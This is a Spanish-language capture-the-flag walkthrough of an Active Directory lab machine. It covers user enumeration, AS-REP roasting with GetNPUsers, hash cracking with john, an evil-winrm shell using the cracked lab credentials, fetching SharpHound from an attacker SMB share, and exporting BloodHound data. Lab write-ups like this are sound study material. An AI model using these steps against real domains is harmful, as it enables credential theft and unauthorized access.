## (Enumerar usuarios válidos con enum4linux, comprobar usuarios que no usen Kerberos con GetNPUsers, listar recursos compartidos con crackmapexec y evilwinrm para obtener reverse shell - Active Directory)

Haremos los reconocimientos de siempre:
![[Pasted image 20230126111303.png]]
Ya que es una máquina Windows, debemos enumerar con crackmapexec qué máquina es y qué windows tiene instalado, el cual se trata de un Windows Server 2016: [[Crackmapexec#Detectar dominio y hostname con crackmapexec]]
![[Pasted image 20230126111311.png]]
Intentamos listar los recursos compartidos con una null session de esta máquina pero no sale nada:
![[Pasted image 20230126111320.png]]
Lo que podemos hacer es intentar enumerar usuarios válidos haciendo uso de la herramienta enum4linux:
![[Pasted image 20230126112406.png]]
![[Pasted image 20230126112436.png]]
Ahora que tenemos todos estos usuarios, vamos a guardarlos todos en un documento para poder usarlos como ataque de fuerza bruta, esto podemos hacerlo a través de expresiones regulares en bash o copiando y pegando cada usuario:
![[Pasted image 20230126113248.png]]
Y lo guardamos dentro del documento users:
![[Pasted image 20230126113324.png]]
Ahora que tenemos este listado de usuarios, hay una herramienta que se llama GetNPusers de impacket que sirve para obtener Ticket Granting Ticket (TGT) de credenciales de aquellos usuarios que no requieren autenticación Kerberos; por tanto debemos pasarle el dominio y el diccionario con los usuarios, y vemos que nos encuentra un hash de uno de los usuarios:
![[Pasted image 20230126114019.png]]
Ahora guardamos este hash en un documento de texto y con john intentamos deshashearla con un ataque de fuerza bruta utilizando el diccionario rockyou.txt:
![[Pasted image 20230126111407.png]]
Y tras ejecutar este comando, obtenemos una contraseña, la cual es s3rvice:
![[Pasted image 20230126114314.png]]
Ahora con crackmapexec podemos validar si estas credenciales son válidas, las cuales vemos que sí:[[Crackmapexec#Comprobar y validar credenciales con crackmapexec]]
![[Pasted image 20230126111426.png]]
Y con estas credenciales ya podemos listar recursos compartidos y los permisos que tenemos:[[Crackmapexec#Listar recursos compartidos con crackmapexec]]
![[Pasted image 20230126111434.png]]
Y ahora podemos ver si este usuario forma parte del grupo win managament users:
![[Pasted image 20230126111442.png]]
Ahora con toda esta información ya podemos ganar una consola interactiva utilizando las credenciales de este usuario utilizando evil-winrm:
```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
![[Pasted image 20230126111450.png]]
Y navegando por los directorios, obtenemos la flag:
![[Pasted image 20230126111458.png]]
Podemos conocer detalles sobre este usuario con el comando net user svc-alfresco:
![[Pasted image 20230130110201.png]]
Ahora para escalar los privilegios podemos utilizar una herramienta llamada bloodhound que nos va a recopilar mucha información acerca del Active Directory de la víctima, por lo que en Kali Linux ya lo tenemos en este directorio:
![[Pasted image 20231123180300.png]]
Y nos lo compartimos con la máquina víctima a través de samba:
![[Pasted image 20231123180423.png]]
Y desde la máquina víctima nos lo recibimos:
```
copy \\10.10.16.6\recurso\SharpHound.exe SharpHound.exe
```
![[Pasted image 20231123180550.png]]
Y ahora ejecutamos el SharpHopund.exe y nos habrá generado un archivo zip:
![[Pasted image 20231123180800.png]]
![[Pasted image 20231123180824.png]]
Y ahora para bajarnos este comprimido, ejecutamos el siguiente comando que nos va a permitir descargar archivos desde Evil-WinRM:
```javascript
download C:\Users\svc-alfresco\Desktop\20231123091422_BloodHound.zip data.zip
```
![[Pasted image 20231123181018.png]]
![[Pasted image 20231123181031.png]]
Y ahora tenemos que arrancar el neo4j console, que será lo que haga funcionar a bloodhound, por tanto ejecutamos el comando `neo4j console`
![[Pasted image 20231123181511.png]]
Y a continuación tenemos que acceder al puerto 7687 para establecer unas credenciales y abrir bloodhound:
```
http://localhost:7474/browser/
```
![[Pasted image 20231123182143.png]]
Aquí nos autenticamos con las credenciales por defecto las cuales son neo4j y neo4j y al darle a connect nos pedirá configurar unas nuevas credenciales:
![[Pasted image 20231123182308.png]]
A continuación, abrimos la app de bloodhound y nos autenticamos con estas nuevas credenciales:
![[Pasted image 20231123182740.png]]
Y una vez dentro le cargamos toda la data que hemos obtenido anteriormente desde la máquina víctima:
![[Pasted image 20231123182913.png]]
En la parte de arriba ponemos el usuario que hemos comprometido:
![[Pasted image 20231123183448.png]]
Y marcamos como pwned este usuario:
![[Pasted image 20231123183429.png]]
Y se nos muestra todo el mapa del AD:
![[Pasted image 20231123184137.png]]
